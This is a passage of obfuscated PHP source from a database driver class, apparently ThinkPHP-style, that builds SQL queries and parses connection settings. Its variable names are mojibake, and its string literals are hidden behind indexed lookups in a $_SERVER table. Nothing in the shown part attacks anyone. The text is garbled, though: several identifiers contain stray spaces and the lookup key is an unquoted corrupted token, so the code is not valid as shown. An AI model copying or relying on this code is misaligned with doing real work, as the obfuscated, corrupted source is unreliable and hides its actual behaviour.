|| !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ë“Â÷ı‚ => $²²ªÛòÕ) { $this->_linkID = $²²ªÛòÕ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($²³‹¾×î = false) { $¬¨â¥¥Ë =& $_SERVER[ü¢ÙÊñÛ]; static $£ÊÈŒÏÔ = array(); static $µ»»´ = -1; if (empty($£ÊÈŒÏÔ)) { foreach ($this->config as $éüÜ‚Šˆ => $¬ı¾Ø¤è) { $£ÊÈŒÏÔ[$éüÜ‚Šˆ] = explode($¬¨â¥¥Ë[60], $¬ı¾Ø¤è); } } if (think_config($¬¨â¥¥Ë[1048])) { if ($²³‹¾×î || think_config($¬¨â¥¥Ë[482]) === !0) { $—Î›éüƒ = floor(mt_rand(0, think_config($¬¨â¥¥Ë[1049]) - 1)); $µ»»´ = $—Î›éüƒ; } else { if (is_numeric(think_config($¬¨â¥¥Ë[1050]))) { $—Î›éüƒ = think_config($¬¨â¥¥Ë[1050]); } else { $—Î›éüƒ = floor(mt_rand(think_config($¬¨â¥¥Ë[1049]), count($£ÊÈŒÏÔ[$¬¨â¥¥Ë[952]]) - 1)); } } } else { $—Î›éüƒ = floor(mt_rand(0, count($£ÊÈŒÏÔ[$¬¨â¥¥Ë[952]]) - 1)); $µ»»´ = $—Î›éüƒ; } $—Î›éüƒ = $µ»»´ !== -1 ? $µ»»´ : $—Î›éüƒ; $ò¿òùÖ“ = array($¬¨â¥¥Ë[954] => isset($£ÊÈŒÏÔ[$¬¨â¥¥Ë[954]][$—Î›éüƒ]) ? $£ÊÈŒÏÔ[$¬¨â¥¥Ë[954]][$—Î›éüƒ] : $£ÊÈŒÏÔ[$¬¨â¥¥Ë[954]][0], $¬¨â¥¥Ë[955] => isset($£ÊÈŒÏÔ[$¬¨â¥¥Ë[955]][$—Î›éüƒ]) ? $£ÊÈŒÏÔ[$¬¨â¥¥Ë[955]][$—Î›éüƒ] : $£ÊÈŒÏÔ[$¬¨â¥¥Ë[955]][0], $¬¨â¥¥Ë[952] => isset($£ÊÈŒÏÔ[$¬¨â¥¥Ë[952]][$—Î›éüƒ]) ? $£ÊÈŒÏÔ[$¬¨â¥¥Ë[952]][$—Î›éüƒ] : $£ÊÈŒÏÔ[$¬¨â¥¥Ë[952]][0], $¬¨â¥¥Ë[953] => isset($£ÊÈŒÏÔ[$¬¨â¥¥Ë[953]][$—Î›éüƒ]) ? $£ÊÈŒÏÔ[$¬¨â¥¥Ë[953]][$—Î›éüƒ] : $£ÊÈŒÏÔ[$¬¨â¥¥Ë[953]][0], $¬¨â¥¥Ë[31] => isset($£ÊÈŒÏÔ[$¬¨â¥¥Ë[31]][$—Î›éüƒ]) ? $£ÊÈŒÏÔ[$¬¨â¥¥Ë[31]][$—Î›éüƒ] : $£ÊÈŒÏÔ[$¬¨â¥¥Ë[31]][0], $¬¨â¥¥Ë[982] => isset($£ÊÈŒÏÔ[$¬¨â¥¥Ë[982]][$—Î›éüƒ]) ? $£ÊÈŒÏÔ[$¬¨â¥¥Ë[982]][$—Î›éüƒ] : $£ÊÈŒÏÔ[$¬¨â¥¥Ë[982]][0], $¬¨â¥¥Ë[27] => isset($£ÊÈŒÏÔ[$¬¨â¥¥Ë[27]][$—Î›éüƒ]) ? $£ÊÈŒÏÔ[$¬¨â¥¥Ë[27]][$—Î›éüƒ] : $£ÊÈŒÏÔ[$¬¨â¥¥Ë[27]][0]); return $this->connect($ò¿òùÖ“, $—Î›éüƒ); } public function parseDSN($­ÑÙ¿•Í) { $Áò‘™¸¬ =& $_SERVER[ü¢ÙÊñÛ]; if (empty($­ÑÙ¿•Í)) { return !1; } $ôÌ¥×Í = parse_url($­ÑÙ¿•Í); if ($ôÌ¥×Í[$Áò‘™¸¬[218]]) { $şšñÀ¾à = array($Áò‘™¸¬[1027] => $ôÌ¥×Í[$Áò‘™¸¬[218]], $Áò‘™¸¬[954] => isset($ôÌ¥×Í[$Áò‘™¸¬[676]]) ? $ôÌ¥×Í[$Áò‘™¸¬[676]] : $Áò‘™¸¬[22], $Áò‘™¸¬[955] => isset($ôÌ¥×Í[$Áò‘™¸¬[1051]]) ? $ôÌ¥×Í[$Áò‘™¸¬[1051]] : $Áò‘™¸¬[22], $Áò‘™¸¬[952] => isset($ôÌ¥×Í[$Áò‘™¸¬[219]]) ? $ôÌ¥×Í[$Áò‘™¸¬[219]] : $Áò‘™¸¬[22], $Áò‘™¸¬[953] => isset($ôÌ¥×Í[$Áò‘™¸¬[220]]) ? $ôÌ¥×Í[$Áò‘™¸¬[220]] : $Áò‘™¸¬[22], $Áò‘™¸¬[31] => isset($ôÌ¥×Í[$Áò‘™¸¬[98]]) ? substr($ôÌ¥×Í[$Áò‘™¸¬[98]], 1) : $Áò‘™¸¬[22]); } else { preg_match($Áò‘™¸¬[1052], trim($­ÑÙ¿•Í), $‰œÂ¬ı); $şšñÀ¾à = array($Áò‘™¸¬[1027] => $‰œÂ¬ı[1], $Áò‘™¸¬[954] => $‰œÂ¬ı[2], $Áò‘™¸¬[955] => $‰œÂ¬ı[3], $Áò‘™¸¬[952] => $‰œÂ¬ı[4], $Áò‘™¸¬[953] => $‰œÂ¬ı[5], $Áò‘™¸¬[31] => $‰œÂ¬ı[6]); } $şšñÀ¾à[$Áò‘™¸¬[982]] = $Áò‘™¸¬[22]; return $şšñÀ¾à; } protected function debug() { $«ĞÀ×¯¡ =& $_SERVER[ü¢ÙÊñÛ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $«ĞÀ×¯¡[1053]; if (think_config($«ĞÀ×¯¡[1054])) { think_status($«ĞÀ×¯¡[1055]); think_trace($this->queryStr . $«ĞÀ×¯¡[1056] . think_status($«ĞÀ×¯¡[34], $«ĞÀ×¯¡[1055], 6) . $«ĞÀ×¯¡[1057], $«ĞÀ×¯¡[22], $«ĞÀ×¯¡[1058]); } } protected function parseLock($´ıúÕ˜ = false) { $¤­Î¨—È =& $_SERVER[ü¢ÙÊñÛ]; if (!$´ıúÕ˜) { return $¤­Î¨—È[22]; } if ($¤­Î¨—È[984] == $this->dbType) { return $¤­Î¨—È[1059]; } return $¤­Î¨—È[1060]; } protected function parseSet($›°ï®¨Š) { $œÕÂ¡®ñ =& $_SERVER[ü¢ÙÊñÛ]; foreach ($›°ï®¨Š as $œìÁÏ©ı => $ëÑÖúÜÉ) { if (is_array($ëÑÖúÜÉ) && $œÕÂ¡®ñ[384] == $ëÑÖúÜÉ[0]) { $ãÍ¯Şˆ[] = $this->parseKey($œìÁÏ©ı) . $œÕÂ¡®ñ[517] . $ëÑÖúÜÉ[1]; } elseif (is_scalar($ëÑÖúÜÉ) || is_null($ëÑÖúÜÉ)) { $ãÍ¯Şˆ[] = $this->parseKey($œìÁÏ©ı) . $œÕÂ¡®ñ[517] . $this->parseValue($ëÑÖúÜÉ); } } return $œÕÂ¡®ñ[1061] . implode($œÕÂ¡®ñ[60], $ãÍ¯Şˆ); } protected function bindParam($ØÌœ’ , $®·ãûÌ–) { $this->bind[$_SERVER[ü¢ÙÊñÛ][14] . $ØÌœ’ ] = $®·ãûÌ–; } protected function parseBind($ÖŒ ‡ÛÄ) { $ÖŒ ‡ÛÄ = array_merge($this->bind, $ÖŒ ‡ÛÄ); $this->bind = array(); return $ÖŒ ‡ÛÄ; } function parseKey(&$öÎ§ç¿, $Ùóœ¶” = true) { if ($Ùóœ¶”) { $öÎ§ç¿ = $this->parseKeyCheck($öÎ§ç¿); } return $öÎ§ç¿; } function parseKeyCheck($ØËüÑ›è) { $Ä€€îÖ =& $_SERVER[ü¢ÙÊñÛ]; $ØËüÑ›è = trim($ØËüÑ›è); if (!preg_match($Ä€€îÖ[1062], $ØËüÑ›è)) { think_exception($Ä€€îÖ[1063] . $ØËüÑ›è); } return $ØËüÑ›è; } protected function parseValue($ç•ÍÑöˆ) { $ÈÖ ŠãĞ =& $_SERVER[ü¢ÙÊñÛ]; if (is_string($ç•ÍÑöˆ)) { $ç•ÍÑöˆ = $ÈÖ ŠãĞ[1023] . $this->escapeString($ç•ÍÑöˆ) . $ÈÖ ŠãĞ[1023]; } elseif (isset($ç•ÍÑöˆ[0]) && is_string($ç•ÍÑöˆ[0]) && strtolower($ç•ÍÑöˆ[0]) == $ÈÖ ŠãĞ[384]) { $ç•ÍÑöˆ = $this->escapeString($ç•ÍÑöˆ[1]); } elseif (is_array($ç•ÍÑöˆ)) { $ç•ÍÑöˆ = array_map(array($this, $ÈÖ ŠãĞ[1024]), $ç•ÍÑöˆ); } elseif (is_bool($ç•ÍÑöˆ)) { $ç•ÍÑöˆ = $ç•ÍÑöˆ ? $ÈÖ ŠãĞ[102] : $ÈÖ ŠãĞ[241]; } elseif (is_null($ç•ÍÑöˆ)) { $ç•ÍÑöˆ = $ÈÖ ŠãĞ[117]; } return $ç•ÍÑöˆ; } protected function parseField($ºÈà½Å÷) { $ şŸ·¶ı =& $_SERVER[ü¢ÙÊñÛ]; if (is_string($ºÈà½Å÷) && strpos($ºÈà½Å÷, $ şŸ·¶ı[60])) { $ºÈà½Å÷ = explode($ şŸ·¶ı[60], $ºÈà½Å÷); } if (is_array($ºÈà½Å÷)) { $‰¤İ¨—ö = array(); foreach ($ºÈà½Å÷ as $ùº½«€ï => $äµÊú®Ã) { if (!is_numeric($ùº½«€ï)) { $‰¤İ¨—ö[] = $this->parseKey($ùº½«€ï, !1) . $ şŸ·¶ı[1064] . $this->parseKey($äµÊú®Ã); } else { $‰¤İ¨—ö[] = $this->parseKey($äµÊú®Ã); } } $±ˆœïöî = implode($ şŸ·¶ı[60], $‰¤İ¨—ö); } elseif (is_string($ºÈà½Å÷) && !empty($ºÈà½Å÷)) { $±ˆœïöî = $ºÈà½Å÷; } else { $±ˆœïöî = $ şŸ·¶ı[233]; } return $±ˆœïöî; } protected function parseTable($ªàÃ±«) { $ôÜÒÓ´™ =& $_SERVER[ü¢ÙÊñÛ]; if (is_array($ªàÃ±«)) { $¯Æœ²› = array(); foreach ($ªàÃ±« as $Èè°ˆ‚É => $€´ˆñöé) { if (!is_numeric($Èè°ˆ‚É)) { $¯Æœ²›[] = $this->parseKey($Èè°ˆ‚É) . $ôÜÒÓ´™[63] . $this->parseKey($€´ˆñöé); } else { $¯Æœ²›[] = $this->parseKey($Èè°ˆ‚É); } } $ªàÃ±« = $¯Æœ²›; } elseif (is_string($ªàÃ±«)) { if (strstr($ªàÃ±«, $ôÜÒÓ´™[63])) { return $ªàÃ±«; } $ªàÃ±« = explode($ôÜÒÓ´™[60], $ªàÃ±«); array_walk($ªàÃ±«, array($this, $ôÜÒÓ´™[972])); } return $ôÜÒÓ´™[966] . trim(implode($ôÜÒÓ´™[1065], $ªàÃ±«), $ôÜÒÓ´™[472]) . $ôÜÒÓ´™[966]; } protected function parseWhere($ëü¹ğØÖ) { $Êòô¬óæ =& $_SERVER[ü¢ÙÊñÛ]; $Ê¦™ë¨¹ = $Êòô¬óæ[22]; if (is_string($ëü¹ğØÖ)) { $Ê¦™ë¨¹ = $ëü¹ğØÖ; } else { $«ÇŸ…®‡ = isset($ëü¹ğØÖ[$Êòô¬óæ[1066]]) ? strtoupper($ëü¹ğØÖ[$Êòô¬óæ[1066]]) : $Êòô¬óæ[22]; if (in_array($«ÇŸ…®‡, array($Êòô¬óæ[1067], $Êòô¬óæ[1068], $Êòô¬óæ[1069]))) { $«ÇŸ…®‡ = $Êòô¬óæ[63] . $«ÇŸ…®‡ . $Êòô¬óæ[63]; unset($ëü¹ğØÖ[$Êòô¬óæ[1066]]); } else { $«ÇŸ…®‡ = $Êòô¬óæ[1070]; } foreach ($ëü¹ğØÖ as $ö‘ š÷“ => $”‘Õ°Ïˆ) { $Ê¦™ë¨¹ .= $Êòô¬óæ[366]; if (is_numeric($ö‘ š÷“)) { $ö‘ š÷“ = $Êòô¬óæ[1071]; } if (0 === strpos($ö‘ š÷“, $Êòô¬óæ[21])) { $Ê¦™ë¨¹ .= $this->parseThinkWhere($ö‘ š÷“, $”‘Õ°Ïˆ); } else { if (!preg_match($Êòô¬óæ[1072], trim($ö‘ š÷“))) { think_exception(think_lang($Êòô¬óæ[1073]) . $Êòô¬óæ[14] . $ö‘ š÷“); } $¹°«° ô = is_array($”‘Õ°Ïˆ) && isset($”‘Õ°Ïˆ[$Êòô¬óæ[1074]]); $ö‘ š÷“ = trim($ö‘ š÷“); if (strpos($ö‘ š÷“, $Êòô¬óæ[225])) { $×¾óóõÅ = explode($Êòô¬óæ[225], $ö‘ š÷“); $Å±Ç™Á„ = array(); foreach ($×¾óóõÅ as $ŒÊ¥¼Ã¤ => $ÒÙàÜîÒ) { $©Ğ´ï®ı = $¹°«° ô ? $”‘Õ°Ïˆ[$ŒÊ¥¼Ã¤] : $”‘Õ°Ïˆ; $Å±Ç™Á„[] = $Êòô¬óæ[349] . $this->parseWhereItem($this->parseKey($ÒÙàÜîÒ), $©Ğ´ï®ı) . $Êòô¬óæ[971]; } $Ê¦™ë¨¹ .= implode($Êòô¬óæ[1075], $Å±Ç™Á„); } elseif (strpos($ö‘ š÷“, $Êòô¬óæ[297])) { $×¾óóõÅ = explode($Êòô¬óæ[297], $ö‘ š÷“); $Å±Ç™Á„ = array(); foreach ($×¾óóõÅ as $ŒÊ¥¼Ã¤ => $ÒÙàÜîÒ) { $©Ğ´ï®ı = $¹°«° ô ? $”‘Õ°Ïˆ[$ŒÊ¥¼Ã¤] : $”‘Õ°Ïˆ; $Å±Ç™Á„[] = $Êòô¬óæ[349] . $this->parseWhereItem($this->parseKey($ÒÙàÜîÒ), $©Ğ´ï®ı) . $Êòô¬óæ[971]; } $Ê¦™ë¨¹ .= implode($Êòô¬óæ[1070], $Å±Ç™Á„); } else { $Ê¦™ë¨¹ .= $this->parseWhereItem($this->parseKey($ö‘ š÷“), $”‘Õ°Ïˆ); } } $Ê¦™ë¨¹ .= $Êòô¬óæ[367] . $«ÇŸ…®‡; } $Ê¦™ë¨¹ = substr($Ê¦™ë¨¹, 0, -strlen($«ÇŸ…®‡)); } return empty($Ê¦™ë¨¹) ? $Êòô¬óæ[22] : $Êòô¬óæ[1076] . $Ê¦™ë¨¹; } protected function parseWhereItem($Ö½ïı„š, $ë‘å­„Š) { $È‹ßİĞ¶ =& $_SERVER[ü¢ÙÊñÛ]; $´£¢×Õ¢ = $È‹ßİĞ¶[22]; if (is_array($ë‘å­„Š)) { if (is_string($ë‘å­„Š[0])) { $§Æœßë‰ = strtolower($ë‘å­„Š[0]); if (in_array($ë‘å­„Š[0], array($È‹ßİĞ¶[517], $È‹ßİĞ¶[1077], $È‹ßİĞ¶[1078], $È‹ßİĞ¶[1079], $È‹ßİĞ¶[1080], $È‹ßİĞ¶[1081]))) { $´£¢×Õ¢ .= $Ö½ïı„š . $È‹ßİĞ¶[63] . $ë‘å­„Š[0] . $È‹ßİĞ¶[63] . $this->parseValue($ë‘å­„Š[1]); } elseif (preg_match($È‹ßİĞ¶[1082], $ë‘å­„Š[0])) { $´£¢×Õ¢ .= $Ö½ïı„š . $È‹ßİĞ¶[63] . $this->exp[$§Æœßë‰] . $È‹ßİĞ¶[63] . $this->parseValue($ë‘å­„Š[1]); } elseif (preg_match($È‹ßİĞ¶[1083], $ë‘å­„Š[0])) { if (is_array($ë‘å­„Š[1])) { $İ‘Õ³—¸ = isset($ë‘å­„Š[2]) ? strtoupper($ë‘å­„Š[2]) : $È‹ßİĞ¶[1068]; if (in_array($İ‘Õ³—¸, array($È‹ßİĞ¶[1067], $È‹ßİĞ¶[1068], $È‹ßİĞ¶[1069]))) { $úÌŞ„˜† = array(); foreach ($ë‘å­„Š[1] as $éÙÂŠÂÍ) { $úÌŞ„˜†[] = $Ö½ïı„š . $È‹ßİĞ¶[63] . $this->exp[$§Æœßë‰] . $È‹ßİĞ¶[63] . $this->parseValue($éÙÂŠÂÍ); } $´£¢×Õ¢ .= $È‹ßİĞ¶[349] . implode($È‹ßİĞ¶[63] . $İ‘Õ³—¸ . $È‹ßİĞ¶[63], $úÌŞ„˜†) . $È‹ßİĞ¶[971]; } } else { $´£¢×Õ¢ .= $Ö½ïı„š . $È‹ßİĞ¶[63] . $this->exp[$§Æœßë‰] . $È‹ßİĞ¶[63] . $this->parseValue($ë‘å­„Š[1]); } } elseif ($È‹ßİĞ¶[384] == $§Æœßë‰) { $´£¢×Õ¢ .= $È‹ßİĞ¶[969] . $Ö½ïı„š . $È‹ßİĞ¶[63] . $ë‘å­„Š[1] . $È‹ßİĞ¶[1084]; } elseif (preg_match($È‹ßİĞ¶[1085], $ë‘å­„Š[0])) { $´£¢×Õ¢ .= $ë‘å­„Š[0]; } elseif (preg_match($È‹ßİĞ¶[1086], $ë‘å­„Š[0])) { if (isset($ë‘å­„Š[2]) && $È‹ßİĞ¶[384] == $ë‘å­„Š[2]) { $´£¢×Õ¢ .= $Ö½ïı„š . $È‹ßİĞ¶[63] . $this->exp[$§Æœßë‰] . $È‹ßİĞ¶[63] . $ë‘å­„Š[1]; } else { if (is_string($ë‘å­„Š[1])) { $ë‘å­„Š[1] = explode($È‹ßİĞ¶[60], $ë‘å­„Š[1]); } $ñ‡ë³´¡ = implode($È‹ßİĞ¶[60], $this->parseValue($ë‘å­„Š[1])); $´£¢×Õ¢ .= $Ö½ïı„š . $È‹ßİĞ¶[63] . $this->exp[$§Æœßë‰] . $È‹ßİĞ¶[969] . $ñ‡ë³´¡ . $È‹ßİĞ¶[971]; } } elseif (preg_match($È‹ßİĞ¶[1087], $ë‘å­„Š[0])) { $œúÅÈºí = is_string($ë‘å­„Š[1]) ? explode($È‹ßİĞ¶[60], $ë‘å­„Š[1]) : $ë‘å­„Š[1]; $´£¢×Õ¢ .= $È‹ßİĞ¶[969] . $Ö½ïı„š . $È‹ßİĞ¶[63] . $this->exp[$§Æœßë‰] . $È‹ßİĞ¶[63] . $this->parseValue($œúÅÈºí[0]) . $È‹ßİĞ¶[1070] . $this->parseValue($œúÅÈºí[1]) . $È‹ßİĞ¶[367]; } else { think_exception(think_lang($È‹ßİĞ¶[1073]) . $È‹ßİĞ¶[14] . $ë‘å­„Š[0]); } } else { $Ÿìµ—íõ = count($ë‘å­„Š); $Ò¬€¡’ = $È‹ßİĞ¶[22]; if (is_string($ë‘å­„Š[$Ÿìµ—íõ - 1])) { $Ò¬€¡’ = isset($ë‘å­„Š[$Ÿìµ—íõ - 1]) ? strtoupper($ë‘å­„Š[$Ÿìµ—íõ - 1]) : $È‹ßİĞ¶[22]; if (in_array($Ò¬€¡’, array($È‹ßİĞ¶[1067], $È‹ßİĞ¶[1068], $È‹ßİĞ¶[1069]))) { $Ÿìµ—íõ = $Ÿìµ—íõ - 1; } } else { $Ò¬€¡’ = $È‹ßİĞ¶[1067]; } for ($©öƒ÷Ú¤ = 0; $©öƒ÷Ú¤ < $Ÿìµ—íõ; $©öƒ÷Ú¤++) { $œúÅÈºí = is_array($ë‘å­„Š[$©öƒ÷Ú¤]) ? $ë‘å­„Š[$©öƒ÷Ú¤][1] : $ë‘å­„Š[$©öƒ÷Ú¤]; if ($È‹ßİĞ¶[384] == strtolower($ë‘å­„Š[$©öƒ÷Ú¤][0])) { $´£¢×Õ¢ .= $È‹ßİĞ¶[349] . $Ö½ïı„š . $È‹ßİĞ¶[63] . $œúÅÈºí . $È‹ßİĞ¶[1084] . $Ò¬€¡’ . $È‹ßİĞ¶[63]; } else { $²–‰¸•­ = is_array($ë‘å­„Š[$©öƒ÷Ú¤]) ? $this->exp[strtolower($ë‘å­„Š[$©öƒ÷Ú¤][0])] : $È‹ßİĞ¶[517]; if (!$²–‰¸•­ && is_array($ë‘å­„Š[$©öƒ÷Ú¤]) && in_array($ë‘å­„Š[$©öƒ÷Ú¤][0], array($È‹ßİĞ¶[517], $È‹ßİĞ¶[1077], $È‹ßİĞ¶[1078], $È‹ßİĞ¶[1079], $È‹ßİĞ¶[1080], $È‹ßİĞ¶[1081]))) { $²–‰¸•­ = $ë‘å­„Š[$©öƒ÷Ú¤][0]; } $´£¢×Õ¢ .= $È‹ßİĞ¶[349] . $Ö½ïı„š . $È‹ßİĞ¶[63] . $²–‰¸•­ . $È‹ßİĞ¶[63] . $this->parseValue($œúÅÈºí) . $È‹ßİĞ¶[1084] . $Ò¬€¡’ . $È‹ßİĞ¶[63]; } } $´£¢×Õ¢ = substr($´£¢×Õ¢, 0, -4); } } else { $´£¢×Õ¢ .= $Ö½ïı„š . $È‹ßİĞ¶[1088] . $this->parseValue($ë‘å­„Š); } return $´£¢×Õ¢; } protected function parseThinkWhere($Ä–—¢¶…, $ô°à¨) { $ÆÅïéÕ =& $_SERVER[ü¢ÙÊñÛ]; $´Ò‹î‰Ş = $ÆÅïéÕ[22]; switch ($Ä–—¢¶…) { case $ÆÅïéÕ[439]: $´Ò‹î‰Ş = $ô°à¨; break; case $ÆÅïéÕ[1071]: $´Ò‹î‰Ş = is_string($ô°à¨) ? $ô°à¨ : substr($this->parseWhere($ô°à¨), 6); break; case $ÆÅïéÕ[1089]: parse_str($ô°à¨, $¦œ°öÕø); if (isset($¦œ°öÕø[$ÆÅïéÕ[1066]])) { $¨úùÜ£ = $ÆÅïéÕ[63] . strtoupper($¦œ°öÕø[$ÆÅïéÕ[1066]]) . $ÆÅïéÕ[63]; unset($¦œ°öÕø[$ÆÅïéÕ[1066]]); } else { $¨úùÜ£ = $ÆÅïéÕ[1070]; } $²é€û„ = array(); foreach ($¦œ°öÕø as $“ Ÿ®½† => $Ô×ÔÃº) { $²é€û„[] = $this->parseKey($“ Ÿ®½†) . $ÆÅïéÕ[1088] . $this->parseValue($Ô×ÔÃº); } $´Ò‹î‰Ş = implode($¨úùÜ£, $²é€û„); break; } return $´Ò‹î‰Ş; } protected function parseLimit($Ï¦Ëáã) { $ÍÒ¹ù´Ø =& $_SERVER[ü¢ÙÊñÛ]; return !empty($Ï¦Ëáã) ? $ÍÒ¹ù´Ø[61] . $Ï¦Ëáã . $ÍÒ¹ù´Ø[63] : $ÍÒ¹ù´Ø[22]; } protected function parseJoin($ş‹òî Ì) { $Œ²İ¹î• =& $_SERVER[ü¢ÙÊñÛ]; $·÷ú èÂ = $Œ²İ¹î•[22]; if (!empty($ş‹òî Ì)) { if (is_array($ş‹òî Ì)) { foreach ($ş‹òî Ì as $Šà—ş¡¹ => $õ‘Æóçæ) { if (!1 !== stripos($õ‘Æóçæ, $Œ²İ¹î•[1090])) { $·÷ú èÂ .= $Œ²İ¹î•[63] . $õ‘Æóçæ; } else { $·÷ú èÂ .= $Œ²İ¹î•[1091] . $õ‘Æóçæ; } } } else { $·÷ú èÂ .= $Œ²İ¹î•[1091] . $ş‹òî Ì; } } $·÷ú èÂ = preg_replace($Œ²İ¹î•[1092], think_config($Œ²İ¹î•[996]) . $Œ²İ¹î•[1093], $·÷ú èÂ); return $·÷ú èÂ; } protected function parseOrder($ø¦ó¾Ÿå) { $›ª£ª¼„ =& $_SERVER[ü¢ÙÊñÛ]; if (is_array($ø¦ó¾Ÿå)) { $‹ßÔ›‹× = array(); foreach ($ø¦ó¾Ÿå as $ã”‹Ÿ¸ => $Ïæ‘ö’±) { if (is_numeric($ã”‹Ÿ¸)) { $‹ßÔ›‹×[] = $this->parseKey($Ïæ‘ö’±); } else { $Ïæ‘ö’± = in_array(strtoupper(trim($Ïæ‘ö’±)), array($›ª£ª¼„[1094], $›ª£ª¼„[1095])) ? $›ª£ª¼„[63] . $Ïæ‘ö’± : $›ª£ª¼„[22]; if (preg_match($›ª£ª¼„[1096], $ã”‹Ÿ¸)) { $‹ßÔ›‹×[] = $this->parseKey($ã”‹Ÿ¸) . $Ïæ‘ö’±; } else { think_exception($›ª£ª¼„[1097] . $ã”‹Ÿ¸); } } } $ø¦ó¾Ÿå = implode($›ª£ª¼„[60], $‹ßÔ›‹×); } return !empty($ø¦ó¾Ÿå) ? $›ª£ª¼„[1098] . $ø¦ó¾Ÿå : $›ª£ª¼„[22]; } protected function parseGroup($¨šÊ÷£˜) { $ñùİ¬Ã• =& $_SERVER[ü¢ÙÊñÛ]; return !empty($¨šÊ÷£˜) ? $ñùİ¬Ã•[1099] . $¨šÊ÷£˜ : $ñùİ¬Ã•[22]; } protected function parseHaving($âªÔº«£) { $ŒıÍ¥» =& $_SERVER[ü¢ÙÊñÛ]; return !empty($âªÔº«£) ? $ŒıÍ¥»[1100] . $âªÔº«£ : $ŒıÍ¥»[22]; } protected function parseComment($’ô¼’‡ö) { $©ë¥’ı =& $_SERVER[ü¢ÙÊñÛ]; return !empty($’ô¼’‡ö) ? $©ë¥’ı[1101] . $’ô¼’‡ö . $©ë¥’ı[1102] : $©ë¥’ı[22]; } protected function parseDistinct($ç£ıÚÄ) { $ëíøï¹ =& $_SERVER[ü¢ÙÊñÛ]; return !empty($ç£ıÚÄ) ? $ëíøï¹[1103] : $ëíøï¹[22]; } protected function parseUnion($‘”£Â¶½) { $‹ÇÕğÍ¾ =& $_SERVER[ü¢ÙÊñÛ]; if (empty($‘”£Â¶½)) { return $‹ÇÕğÍ¾[22]; } if (isset($‘”£Â¶½[$‹ÇÕğÍ¾[435]])) { $òìîÊ©È = $‹ÇÕğÍ¾[1104]; unset($‘”£Â¶½[$‹ÇÕğÍ¾[435]]); } else { $òìîÊ©È = $‹ÇÕğÍ¾[1105]; } foreach ($‘”£Â¶½ as $¹¹Œ¨ğ†) { $óâ°èíÓ[] = $òìîÊ©È . (is_array($¹¹Œ¨ğ†) ? $this->buildSelectSql($¹¹Œ¨ğ†) : $¹¹Œ¨ğ†); } return implode($‹ÇÕğÍ¾[63], $óâ°èíÓ); } public function insert($õÒ“ÈÄû, $­ıªò†Ó = array(), $øÄùî± = false) { $ÉÏ¿Š =& $_SERVER[ü¢ÙÊñÛ]; $Âôûˆò® = $æãÛ¼Ñ¦ = array(); $this->model = $­ıªò†Ó[$ÉÏ¿Š[370]]; foreach ($õÒ“ÈÄû as $ÁëÜñ–ˆ => $°£´×·¹) { if (is_array($°£´×·¹) && $ÉÏ¿Š[384] == $°£´×·¹[0]) { $æãÛ¼Ñ¦[] = $this->parseKey($ÁëÜñ–ˆ); $Âôûˆò®[] = $°£´×·¹[1]; } elseif (is_scalar($°£´×·¹) || is_null($°£´×·¹)) { $æãÛ¼Ñ¦[] = $this->parseKey($ÁëÜñ–ˆ); $Âôûˆò®[] = $this->parseValue($°£´×·¹); } } $ œÜõ°è = ($øÄùî± ? $ÉÏ¿Š[973] : $ÉÏ¿Š[974]) . $ÉÏ¿Š[975] . $this->parseTable($­ıªò†Ó[$ÉÏ¿Š[368]]) . $ÉÏ¿Š[969] . implode($ÉÏ¿Š[60], $æãÛ¼Ñ¦) . $ÉÏ¿Š[970] . implode($ÉÏ¿Š[60], $Âôûˆò®) . $ÉÏ¿Š[971]; $ œÜõ°è .= $this->parseLock(isset($­ıªò†Ó[$ÉÏ¿Š[910]]) ? $­ıªò†Ó[$ÉÏ¿Š[910]] : !1); $ œÜõ°è .= $this->parseComment(!empty($­ıªò†Ó[$ÉÏ¿Š[441]]) ? $­ıªò†Ó[$ÉÏ¿Š[441]] : $ÉÏ¿Š[22]); return $this->execute($ œÜõ°è, $this->parseBind(!empty($­ıªò†Ó[$ÉÏ¿Š[372]]) ? $­ıªò†Ó[$ÉÏ¿Š[372]] : array())); } public function selectInsert($Æ­×Æú¦, $ø©Ì—‰, $¿ìğŒÁ¦ = array()) { $É®¹³– =& $_SERVER[ü¢ÙÊñÛ]; $this->model = $¿ìğŒÁ¦[$É®¹³–[370]]; if (is_string($Æ­×Æú¦)) { $Æ­×Æú¦ = explode($É®¹³–[60], $Æ­×Æú¦); } array_walk($Æ­×Æú¦, array($this, $É®¹³–[972])); $¿º©Õ÷ = $É®¹³–[1106] . $this->parseTable($ø©Ì—‰) . $É®¹³–[969] . implode($É®¹³–[60], $Æ­×Æú¦) . $É®¹³–[1084]; $¿º©Õ÷ .= $this->buildSelectSql($¿ìğŒÁ¦); return $this->execute($¿º©Õ÷, $this->parseBind(!empty($¿ìğŒÁ¦[$É®¹³–[372]]) ? $¿ìğŒÁ¦[$É®¹³–[372]] : array())); } public function update($‚ºêá±Õ, $ş“äÂÂŠ) { $‡ï°ıäô =& $_SERVER[ü¢ÙÊñÛ]; $this->model = $ş“äÂÂŠ[$‡ï°ıäô[370]]; $Üñ¦„Õ‡ = $‡ï°ıäô[1107] . $this->parseTable($ş“äÂÂŠ[$‡ï°ıäô[368]]) . $this->parseSet($‚ºêá±Õ) . $this->parseWhere(!empty($ş“äÂÂŠ[$‡ï°ıäô[364]]) ? $ş“äÂÂŠ[$‡ï°ıäô[364]] : $‡ï°ıäô[22]) . $this->parseOrder(!empty($ş“äÂÂŠ[$‡ï°ıäô[453]]) ? $ş“äÂÂŠ[$‡ï°ıäô[453]] : $‡ï°ıäô[22]) . $this->parseLimit(!empty($ş“äÂÂŠ[$‡ï°ıäô[379]]) ? $ş“äÂÂŠ[$‡ï°ıäô[379]] : $‡ï°ıäô[22]) . $this->parseLock(isset($ş“äÂÂŠ[$‡ï°ıäô[910]]) ? $ş“äÂÂŠ[$‡ï°ıäô[910]] : !1) . $this->parseComment(!empty($ş“äÂÂŠ[$‡ï°ıäô[441]]) ? $ş“äÂÂŠ[$‡ï°ıäô[441]] : $‡ï°ıäô[22]); return $this->execute($Üñ¦„Õ‡, $this->parseBind(!empty($ş“äÂÂŠ[$‡ï°ıäô[372]]) ? $ş“äÂÂŠ[$‡ï°ıäô[372]] : array())); } public function delete($Ö»¨¸ª¨ = array()) { $¹Ï±ŸÈ› =& $_SERVER[ü¢ÙÊñÛ]; $this->model = 